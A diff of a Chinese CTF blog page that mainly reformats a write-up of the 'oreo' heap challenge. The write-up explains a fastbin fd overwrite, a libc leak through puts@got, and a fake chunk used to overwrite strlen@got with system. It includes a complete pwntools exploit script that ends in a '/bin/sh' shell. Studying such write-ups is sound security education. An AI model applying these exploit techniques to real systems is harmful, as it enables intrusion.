@@ -78,9 +78,33 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/heap/" class="animsition-link">heap<small>(1)</small></a></li>
+				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
-				    <li><a href="/categories/stack/" class="animsition-link">stack<small>(1)</small></a></li>
+				    <li><a href="/categories/Heap-Fastbin-Attack/" class="animsition-link">Heap - Fastbin Attack<small>(6)</small></a></li>
+				    
+				    <li><a href="/categories/Heap-Off-By-One/" class="animsition-link">Heap - Off By One<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Heap-Tcache/" class="animsition-link">Heap - Tcache<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(17)</small></a></li>
+				    
+				    <li><a href="/categories/OTHER-IO-FILE/" class="animsition-link">OTHER - IO FILE<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Pwn-college/" class="animsition-link">Pwn.college<small>(9)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-DynELF/" class="animsition-link">STACK - DynELF<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Format/" class="animsition-link">STACK - Format<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ROP/" class="animsition-link">STACK - ROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-SROP/" class="animsition-link">STACK - SROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Stack-Overflow/" class="animsition-link">STACK - Stack Overflow<small>(4)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2dlsolve/" class="animsition-link">STACK - ret2dlsolve<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-sandbox/" class="animsition-link">STACK - sandbox<small>(1)</small></a></li>
 				    
 				</ul>
         	</li>
@@ -175,7 +199,7 @@
     
     
     | 
-    <a href='/tags/heap/'>heap</a>
+    <a href='/tags/UAF/'>UAF</a>
     
     
 </span>
@@ -183,136 +207,50 @@
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<html><head></head><body><p>​    </p>
-<h4 id="overview">overview<a class="post-anchor" href="#overview"></a></h4><p>​        <a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%883.11.04.png" data-caption="截屏2022-03-17 下午3.11.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%883.11.04.png" alt="截屏2022-03-17 下午3.11.04"></a></p>
+      		<p>​    </p>
+<h4 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h4><p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%883.11.04.png" alt="截屏2022-03-17 下午3.11.04"></p>
 <p>​        搞不懂为什么这么多题都要stripped。</p>
-<h4 id="逆向">逆向<a class="post-anchor" href="#逆向"></a></h4><h5 id="add">add<a class="post-anchor" href="#add"></a></h5><h5 id=""><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.27.45.png" data-caption="截屏2022-03-17 下午5.27.45" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.27.45.png" alt="截屏2022-03-17 下午5.27.45"></a><a class="post-anchor" href="#"></a></h5><p>​        申请0x38大小的chunk，user space开始处存枪支的description,+0x19处存放枪支的name。</p>
+<h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><h5 id="add"><a href="#add" class="headerlink" title="add"></a>add</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.27.45.png" alt="截屏2022-03-17 下午5.27.45"></h5><p>​        申请0x38大小的chunk，user space开始处存枪支的description,+0x19处存放枪支的name。</p>
 <p>​        输入name的时候，最大长度为56，导致能够溢出，覆盖fd字段。</p>
-<p>​        同时每输入信息以后都会有一个保存指针的操作：<br><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.35.13.png" data-caption="截屏2022-03-17 下午5.35.13" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.35.13.png" alt="截屏2022-03-17 下午5.35.13"></a></p>
-<h5 id="free">free<a class="post-anchor" href="#free"></a></h5><p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.33.13.png" data-caption="截屏2022-03-17 下午5.33.13" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.33.13.png" alt="截屏2022-03-17 下午5.33.13"></a></p>
+<p>​        同时每输入信息以后都会有一个保存指针的操作：<br><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.35.13.png" alt="截屏2022-03-17 下午5.35.13"></p>
+<h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.33.13.png" alt="截屏2022-03-17 下午5.33.13"></p>
 <p>​            虽然free了ptr，但是会将allocaed chunk的fd字段作为free后的fd指针，存在ptr指向的地址。</p>
-<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.51.06.png" data-caption="截屏2022-03-17 下午5.51.06" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.51.06.png" alt="截屏2022-03-17 下午5.51.06"></a></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%885.51.06.png" alt="截屏2022-03-17 下午5.51.06"></p>
 <p>​        可以看到bin中的fd。</p>
-<h5 id="show">show<a class="post-anchor" href="#show"></a></h5><p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%882.06.39.png" data-caption="截屏2022-03-18 下午2.06.39" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%882.06.39.png" alt="截屏2022-03-18 下午2.06.39"></a></p>
+<h5 id="show"><a href="#show" class="headerlink" title="show"></a>show</h5><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%882.06.39.png" alt="截屏2022-03-18 下午2.06.39"></p>
 <p>​    </p>
 <p>​            打印descrption时会将fd指针所所指向的内容打印出来。</p>
-<h5 id="message-amp-show-status">message&amp;show status<a class="post-anchor" href="#message-amp-show-status"></a></h5><p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.22.16.png" data-caption="截屏2022-03-18 下午3.22.16" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.22.16.png" alt="截屏2022-03-18 下午3.22.16"></a>            </p>
+<h5 id="message-amp-show-status"><a href="#message-amp-show-status" class="headerlink" title="message&amp;show status"></a>message&amp;show status</h5><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.22.16.png" alt="截屏2022-03-18 下午3.22.16">            </p>
 <p>​        注意<code>fgets()</code>的定义，将128字节从stdin读进notice指向的地址（bss段上），然后在show status函数中打印出来。</p>
-<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.23.24.png" data-caption="截屏2022-03-18 下午3.23.24" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.23.24.png" alt="截屏2022-03-18 下午3.23.24"></a></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.23.24.png" alt="截屏2022-03-18 下午3.23.24"></p>
 <p>​        所以可以看到，在一般情况下，向message留言，一般内存布局是这样子的</p>
-<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%884.01.09.png" data-caption="截屏2022-03-18 下午4.01.09" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%884.01.09.png" alt="截屏2022-03-18 下午4.01.09"></a></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%884.01.09.png" alt="截屏2022-03-18 下午4.01.09"></p>
 <p>​        也就是a2a8指向a2c0，所以是向a2c0写入数据。这样如果把a2a8储存的数据改为某个函数的got表，就能够实现got表的更改。</p>
-<h4 id="利用">利用<a class="post-anchor" href="#利用"></a></h4><h6 id="把fd项填为puts-got的地址，从而泄露libc基址，计算system地址">把fd项填为<code>puts@got</code>的地址，从而泄露libc基址，计算system地址<a class="post-anchor" href="#把fd项填为puts-got的地址，从而泄露libc基址，计算system地址"></a></h6><p>​    泄露地址利用了程序的第一个漏洞，正因为打印descrption时会将fd指针所所指向的内容打印出来，所以如果我们将其覆盖为<code>puts()</code>的got表地址，就能够泄露其地址。</p>
-<pre><code class="python">add(25 * b'a', name)
-show_rifle()
-p.recvuntil('===================================\n')
-p.recvuntil('Description: ')
-puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
-print(hex(puts_addr))
-</code></pre>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h6 id="把fd项填为puts-got的地址，从而泄露libc基址，计算system地址"><a href="#把fd项填为puts-got的地址，从而泄露libc基址，计算system地址" class="headerlink" title="把fd项填为puts@got的地址，从而泄露libc基址，计算system地址"></a>把fd项填为<code>puts@got</code>的地址，从而泄露libc基址，计算system地址</h6><p>​    泄露地址利用了程序的第一个漏洞，正因为打印descrption时会将fd指针所所指向的内容打印出来，所以如果我们将其覆盖为<code>puts()</code>的got表地址，就能够泄露其地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">25</span> * <span class="string">b&#x27;a&#x27;</span>, name)</span><br><span class="line">show_rifle()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
+
 <p>​        然后按套路算出<code>system()</code>的地址。</p>
-<pre><code class="python">libcbase = puts_addr - libc.symbols('puts')
-system_addr = libcbase + libc.symbols('system')
-log.success('system_addr ' + hex(system_addr))
-</code></pre>
-<h6 id="利用任意地址写覆盖free-got为system-addr">利用任意地址写覆盖free@got为system_addr<a class="post-anchor" href="#利用任意地址写覆盖free-got为system-addr"></a></h6><p>​        刚才说到，我们可以将notice处的指针改为got表地址，为了做到这一点，我们需要在这个地址附近申请一个fake chunkk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libcbase = puts_addr - libc.symbols(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.symbols(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;system_addr &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br></pre></td></tr></table></figure>
+
+<h6 id="利用任意地址写覆盖free-got为system-addr"><a href="#利用任意地址写覆盖free-got为system-addr" class="headerlink" title="利用任意地址写覆盖free@got为system_addr"></a>利用任意地址写覆盖free@got为system_addr</h6><p>​        刚才说到，我们可以将notice处的指针改为got表地址，为了做到这一点，我们需要在这个地址附近申请一个fake chunkk。</p>
 <p>​        这里主要利用到了<code>order()</code>函数中的漏洞。虽然free的过程中将ptr置0，但是chunk中还保存着fd。</p>
 <p>​        最开始有一个简单的想法，就是直接将fd覆盖为got表地址，从而在got表项地址处申请chunk来修改，想法是自然的，然而如果只是单纯地将fd覆盖为free@got，并不能成功地在target addr分配chunk，这是由于分配chunk时的一系列检测。</p>
-<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.11.png" data-caption="截屏2022-03-18 下午3.45.11" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.11.png" alt="截屏2022-03-18 下午3.45.11"></a></p>
-<p>​        <a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.41.png" data-caption="截屏2022-03-18 下午3.45.41" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.41.png" alt="截屏2022-03-18 下午3.45.41"></a></p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.11.png" alt="截屏2022-03-18 下午3.45.11"></p>
+<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%883.45.41.png" alt="截屏2022-03-18 下午3.45.41"></p>
 <p>​        如果直接将fd填成<code>free_got_addr</code>，就会造成double free。为什么捏？如果是地址无效我还是能够理解，但是double free我确实不理解。在free了当前chunk之后，fastbin不是应该长这样 》<code>main_arena =&gt; free_got_addr =&gt;chunk0</code>?怎么会有double free呢？</p>
 <p>​        </p>
 <p>​        先不管。</p>
 <p>​        回到在notice附近构造fake chunk，可以先add一个chunk，并按照之前的方式覆盖fd为notice的地址。这样一来当我们free这个chunk，再add 相同size的chunk时，notice就会被作为fake chunk的ptr，被分配出去。</p>
 <p>​        当然，为了成功伪造fake chunk，我们至少要将notice的空间添加一些chunk该有的结构，比如说size。以及next chunk的size和prev size。</p>
 <p>​        为了覆盖got表，user space开始的地址需要是<code>0x804A2A</code>,所以这个chunk的size的地址在<code>0x804A2A4</code></p>
-<p>​        <a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%885.24.13.png" data-caption="截屏2022-03-18 下午5.24.13" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%885.24.13.png" alt="截屏2022-03-18 下午5.24.13"></a></p>
+<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%885.24.13.png" alt="截屏2022-03-18 下午5.24.13"></p>
 <p>​        可以看到这个地址正好是枪支已经添加的数量，所以为了构造fake chunk的size，我们可以先总共申0x40个枪支，因为之前泄露libc已经申请了一个，所以只需要再申请0x40-1只。</p>
-<pre><code class="python">from pwn import *
-from LibcSearcher import LibcSearcher
-
-libc = ELF("/glibc/2.23/32/lib/libc-2.23.so")
-context.terminal = ['tmux','splitw','-h']
-context.log_level = "debug"
-
-'''
-if args['REMOTE']:
-    p = remote("node4.buuoj.cn",27999)
-else:
-    '''
-p = process(["/glibc/2.23/32/lib/ld-2.23.so","./oreo"],env={"LD_PRELOAD" : "/glibc/2.23/32/lib/libc.so.6"})
-elf = ELF('./oreo')
-
-strlen_got_addr = elf.got['strlen']
-notice_addr = 0x804A2A8
-free_got_addr = 0x804A238 
-
-def add(descrip, name):
-    p.sendline('1')
-    #p.recvuntil('Rifle name: ')
-    p.sendline(name)
-    #p.recvuntil('Rifle description: ')
-    #sleep(0.5)
-    p.sendline(descrip)
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class="line"><span class="string">    p = remote(&quot;node4.buuoj.cn&quot;,27999)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">p = process([<span class="string">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class="string">&quot;./oreo&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./oreo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strlen_got_addr = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">notice_addr = <span class="number">0x804A2A8</span></span><br><span class="line">free_got_addr = <span class="number">0x804A238</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">descrip, name</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Rifle name: &#x27;)</span></span><br><span class="line">    p.sendline(name)</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Rifle description: &#x27;)</span></span><br><span class="line">    <span class="comment">#sleep(0.5)</span></span><br><span class="line">    p.sendline(descrip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_rifle</span>():</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span>():</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">notice</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#p.recvuntil(&quot;Enter any notice you&#x27;d like to submit with your order: &quot;)</span></span><br><span class="line">    p.sendline(notice)</span><br><span class="line"></span><br><span class="line"><span class="comment">#find libc base</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">27</span> * <span class="string">b&#x27;a&#x27;</span> + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">add(<span class="number">25</span> * <span class="string">b&#x27;a&#x27;</span>, name)</span><br><span class="line">show_rifle()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;===================================\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system_addr &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite free@got</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> n &lt; <span class="number">0x3f</span>:</span><br><span class="line"><span class="comment"># set next link=NULL</span></span><br><span class="line">    add(<span class="number">25</span> * <span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">27</span> + p32(<span class="number">0</span>))</span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">27</span>+p32(notice_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>  +p32(<span class="number">0x40</span>) + p32(<span class="number">0x99</span>)<span class="comment">#</span></span><br><span class="line">payload = payload.ljust(<span class="number">52</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">128</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">message(payload)</span><br><span class="line">order()</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;Okay order submitted!\n&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#modify the strlen_got to system</span></span><br><span class="line"></span><br><span class="line">payload = p32(strlen_got_addr).ljust(<span class="number">20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(payload,<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">message(p32(system_addr) + <span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
-def show_rifle():
-    p.sendline('2')
-    p.recvuntil('===================================\n')
 
-
-def order():
-    p.sendline('3')
-
-
-def message(notice):
-    p.sendline('4')
-    #p.recvuntil("Enter any notice you'd like to submit with your order: ")
-    p.sendline(notice)
-
-#find libc base
-
-name = 27 * b'a' + p32(elf.got['puts'])
-add(25 * b'a', name)
-show_rifle()
-p.recvuntil('===================================\n')
-p.recvuntil('Description: ')
-puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
-log.success('puts_addr ' + hex(puts_addr))
-
-libcbase = puts_addr - libc.symbols['puts']
-system_addr = libcbase + libc.symbols['system']
-log.success('system_addr ' + hex(system_addr))
-
-#overwrite free@got
-n = 1
-while n &lt; 0x3f:
-# set next link=NULL
-    add(25 * b'a', b'a' * 27 + p32(0))
-    n += 1
-add(b'a'*25,b'b'*27+p32(notice_addr))
-
-payload = b'\x00'*0x20  +p32(0x40) + p32(0x99)#
-payload = payload.ljust(52,b'a')
-payload += p32(0)
-payload = payload.ljust(128,b'c')
-message(payload)
-order()
-#p.recvuntil('Okay order submitted!\n')
-
-
-#modify the strlen_got to system
-
-payload = p32(strlen_got_addr).ljust(20,b'a')
-add(payload,b'a'*20)
-gdb.attach(p)
-
-message(p32(system_addr) + b';/bin/sh\x00')
-
-p.interactive()
-</code></pre>
 <p>​                </p>
-</body></html>
+
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
@@ -324,7 +262,7 @@ p.interactive()
     
     
     <a class="pull-right" href="../week3-3.1/">
-        week3-3.1 →
+        xdctf2015_pwn200 →
     </a>
     
 </nav>
